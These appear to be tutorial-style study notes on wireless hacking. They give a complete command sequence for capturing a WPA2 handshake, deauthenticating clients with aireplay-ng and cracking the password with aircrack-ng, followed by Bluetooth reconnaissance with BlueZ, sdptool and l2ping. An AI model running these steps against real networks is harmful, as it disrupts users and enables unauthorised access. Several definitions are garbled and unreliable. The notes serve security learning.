#### Basic Network Vocab
*AP* = Access Point
*ESSID* = (Extended Service Set Identifier)
*BSSID* = (Basic Service Set Identifier)
*SSID* = (Service Set Identifier)
*Channels* = Can operate from 1 to 14, and in the US from 1 to 11.
*Power* = How far you are from the signal
*Security* = WEP, WPA1, WPA2, WPA3
*Modes* = Managed, Master, Master
*Frequency* = 2.4GHHz or 5GHz

#### Basic Network Commands
`ifconfig` to see details of wireless interfaces
`iwconfig` to only see your wireless interfaces
`iwlist wlan0 scan` to see all the Wi-Fi APs in your area. (Will include key data about each AP)
`ncmli dev wifi` will do the same as above. (Key data)
`nmcli dev wifi connect AP-ESSID password APpassword` to connect to an AP

#### Airmon-ng
To put your wireless network card into monitor mode use the command:
`airmon-ng start | stop | restart interface`
example:
`airmon-ng start wlan0`
stop will stop monitor mode, and restart will restart your wireless interface if runs into any type of errors.

#### Airodump-ng
airodump-ng is used to capture and display key data of APs and clients connected to them.
Once Airodump-ng is started, it will pick up data such as:
- BSSID: MAC Address of the AP or Client
- PWR: The strengh of the signal
- ENC: The encryption used to secure the transmission
- Data: The data throughput rate
- CH: The channel the AP is operating on
- ESSID: The name of the AP

`airodump-ng wlan0mon` will start scanning.

`airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hacker-ArisePSK wlan0mon` This command will captures all packets traversing the AP on channel using the -c option

In another terminal you can use the aireplay-ng to knock off (deauthenticate anyone connected to the AP and force them to re authenticate to the AP). When they re authenticate, you can capture the hash of their password that is exchanged in the WPA2-PSK four-way handshake. The password hash will appear in the upper-right corner of the airodump-ng terminal.
`aireplay-ng --deauth 99999 -a 01:02:CC:DD:03:CF -c A0:A3:E2:44:7C:E5 wlan0mon`

Finally in the final terminal, you can use a password list (wordlist.dic) to find the password in the captured hash (Hacker-ArisePSK.cap), as shown here:
`aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hacker-ArisePSK.cap`

#### How Bluetooth works:
Bluetooth is a universal protocol for low-power, near field communications operating at 2.4-2.485Ghz using spread spectrum, frequency hopping at 1,600 hops per second. (This frequency hopping is a security measure).

The bluetooth specification has a min range of *10m* but there is no limit to the upper range. Many devices have ranges as large as *100m*.
Connecting 2 bluetooth devices together is refered as *pairing*.

2 bluetooth devices can connect to each other if they are in discoverable mode. When they are in Discoverable mode, they will transmit:
- Name
- Class
- List of Services
- Technical Information
When 2 bluetooth devices pair with each other they exchange a secret or link key. Each stores this link key so it can identify the other in future pairing.
Every device has a unique 48-bit idenditifier (A MAC-like address) and usually a manufacturer-assigned name.

#### Bluetooth Scanning and Reconnaissance
We will be using a tool called BlueZ
To install it run: `apt-get install bluez` 
BlueZ has a number of simple tools we can use to manage and scan Bluetooth devices, including:
- `hciconfig`: equivalent of ifconfig for bluetooth
- `hcitool`: provides us with device name, device ID, device class and device clock info which enables the devices to work synchronously
- `hcidump`: Used to sniff bluetooth communications, meaning we can capture data sent over bluetooth.

We can check that our adapter is up by running: `hciconfig`
Next we need to check that the connection is enabled, we can do so with: `hciconfig hci0 up`

Then, we can start sniffing bluetooth connections with the command:
`hcitool scan` It should pick up bluetooth connections around you.

Next we can gather intel about the detected devices with the inquiry function inq:
`hcitool inq`
This will give us the MAC Address, the clock offset and the class. The class indicates what type of Bluetooth device you found. We can look up the code and see what type of Bluetooth device it is by going to the Bluetooth SIG site at: https://www.bluetooth.org/en-us/specification/assigned-numbers/service-discovery

#### Scanning for Services with sdptool (Service Discovery Protocol (It's a bluetooth protocol))

Using the command: `sdptool browse MACaddress` will start searching for services on devices we've previously scanned.

We can then try to reach those devices with a ping using:
`l2ping MACaddress -c NumberOfPackets`

for example: `l2ping 76:6E:46:63:72:66 -c 3`